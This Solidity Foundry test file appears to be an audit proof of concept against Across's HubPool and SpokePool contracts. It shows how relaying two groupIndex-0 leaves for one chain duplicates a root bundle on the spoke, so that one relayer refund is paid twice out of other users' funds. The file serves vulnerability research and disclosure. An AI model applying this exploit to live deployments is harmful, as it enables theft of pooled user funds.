// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { ReplayBase } from "./util/Base.sol";
import { HubPoolInterface } from "across/interfaces/HubPoolInterface.sol";
import { SpokePoolInterface } from "across/interfaces/SpokePoolInterface.sol";
import { MintableERC20 } from "across/test/MockERC20.sol";
import { Ethereum_Adapter } from "across/chain-adapters/Ethereum_Adapter.sol";
import { Ethereum_SpokePool } from "across/spoke-pools/Ethereum_SpokePool.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts-v4/proxy/ERC1967/ERC1967Proxy.sol";
import { V3SpokePoolInterface } from "across/interfaces/V3SpokePoolInterface.sol";
import { AddressToBytes32 } from "across/libraries/AddressConverters.sol";

// Binding map beta_root : (bundle, chain) -> spoke rootBundleIds must be a function into a singleton.
// HubPool relays roots once per leaf with groupIndex == 0 (HubPool.sol:671); nothing on-chain bounds the
// number of such leaves per chain. The spoke's replay key is (rootBundleId, leafId) (SpokePool.sol:1550-1557),
// so each extra relay mints a fresh, independently consumable copy of every refund leaf.
contract T03_DuplicateRootRelay is ReplayBase {
    using AddressToBytes32 for address;
    MintableERC20 dai;
    Ethereum_SpokePool spoke;
    address relayer = makeAddr("relayer");

    function setUp() public {
        createHubPoolFixture();
        dai = fixture.dai;
        Ethereum_Adapter adapter = new Ethereum_Adapter();
        Ethereum_SpokePool impl = new Ethereum_SpokePool(address(fixture.weth), 3600, 21600, address(0));
        spoke = Ethereum_SpokePool(
            payable(new ERC1967Proxy(address(impl), abi.encodeCall(Ethereum_SpokePool.initialize, (0, address(fixture.hubPool)))))
        );
        spoke.transferOwnership(address(fixture.hubPool)); // admin of a same-chain spoke = HubPool
        fixture.hubPool.setCrossChainContracts(block.chainid, address(adapter), address(spoke));
        enableToken(block.chainid, address(dai), address(dai));
        addLiquidity(dai, 1000 ether);
        dai.mint(address(spoke), 500 ether); // pre-existing spoke inventory (deposits of other users)
    }

    function test_twoGroupZeroLeaves_doubleRefund() public {
        // Relayer refund tree: one leaf paying the relayer 100 DAI on this chain.
        SpokePoolInterface.RelayerRefundLeaf memory rr = _refundLeaf(block.chainid, address(dai), relayer, 100 ether, 0);
        bytes32 rrRoot = keccak256(abi.encode(rr));

        // Pool rebalance tree: two leaves for the SAME chain, both groupIndex 0 (violates the off-chain UMIP rule
        // "only one leaf per chainId should have groupIndex 0", HubPoolInterface.sol:29-32, never checked on-chain).
        HubPoolInterface.PoolRebalanceLeaf memory a = _prLeaf(block.chainid, 0, 0, address(dai), 100 ether, 0);
        HubPoolInterface.PoolRebalanceLeaf memory b = _prLeaf(block.chainid, 0, 1, address(dai), 0, 0);
        bytes32 ha = _prHash(a);
        bytes32 hb = _prHash(b);
        _propose(2, _hashPair(ha, hb), rrRoot, bytes32(0));
        vm.warp(block.timestamp + fixture.hubPool.liveness() + 1);
        _exec(a, _one(hb));
        _exec(b, _one(ha));

        // Two root bundles with identical roots now exist on the spoke.
        assertEq(dai.balanceOf(address(spoke)), 600 ether);
        (, bytes32 r0) = spoke.rootBundles(0);
        (, bytes32 r1) = spoke.rootBundles(1);
        assertEq(r0, rrRoot);
        assertEq(r1, rrRoot);

        // The same refund leaf (same leafId, same proof) is consumable once per copy.
        spoke.executeRelayerRefundLeaf(0, rr, new bytes32[](0));
        spoke.executeRelayerRefundLeaf(1, rr, new bytes32[](0));
        emit log_named_uint("relayer received", dai.balanceOf(relayer));
        assertEq(dai.balanceOf(relayer), 200 ether, "one refund entitlement paid twice");
        // A third execution against either copy is rejected: the guard is per (rootBundleId, leafId), not per leaf.
        vm.expectRevert();
        spoke.executeRelayerRefundLeaf(0, rr, new bytes32[](0));
    }

    // Same duplicated root, two leaf types, two key scopes: refunds are keyed by (rootBundleId, leafId) and pay
    // once per copy; slow fills are keyed by relayHash in fillStatuses (scope = spoke) and pay once in total.
    function test_keyScopeAsymmetry_slowFillOnce_refundTwice() public {
        address recipient = makeAddr("recipient");
        V3SpokePoolInterface.V3RelayData memory rd = V3SpokePoolInterface.V3RelayData({
            depositor: makeAddr("depositor").toBytes32(),
            recipient: recipient.toBytes32(),
            exclusiveRelayer: bytes32(0),
            inputToken: address(dai).toBytes32(),
            outputToken: address(dai).toBytes32(),
            inputAmount: 50 ether,
            outputAmount: 50 ether,
            originChainId: 777,
            depositId: 1,
            fillDeadline: uint32(block.timestamp + 30 days),
            exclusivityDeadline: 0,
            message: ""
        });
        V3SpokePoolInterface.V3SlowFill memory sf = V3SpokePoolInterface.V3SlowFill({
            relayData: rd,
            chainId: block.chainid,
            updatedOutputAmount: 50 ether
        });
        bytes32 slowRoot = keccak256(abi.encode(sf));
        SpokePoolInterface.RelayerRefundLeaf memory rr = _refundLeaf(block.chainid, address(dai), relayer, 100 ether, 0);
        bytes32 rrRoot = keccak256(abi.encode(rr));
        HubPoolInterface.PoolRebalanceLeaf memory a = _prLeaf(block.chainid, 0, 0, address(dai), 0, 0);
        HubPoolInterface.PoolRebalanceLeaf memory b = _prLeaf(block.chainid, 0, 1, address(dai), 0, 0);
        bytes32 ha = _prHash(a);
        bytes32 hb = _prHash(b);
        _propose(2, _hashPair(ha, hb), rrRoot, slowRoot);
        vm.warp(block.timestamp + fixture.hubPool.liveness() + 1);
        _exec(a, _one(hb));
        _exec(b, _one(ha));

        spoke.executeSlowRelayLeaf(sf, 0, new bytes32[](0));
        vm.expectRevert(V3SpokePoolInterface.RelayFilled.selector);
        spoke.executeSlowRelayLeaf(sf, 1, new bytes32[](0));
        assertEq(dai.balanceOf(recipient), 50 ether, "slow fill: once (relayHash scope)");

        spoke.executeRelayerRefundLeaf(0, rr, new bytes32[](0));
        spoke.executeRelayerRefundLeaf(1, rr, new bytes32[](0));
        assertEq(dai.balanceOf(relayer), 200 ether, "refund: twice (root-copy scope)");
    }
}
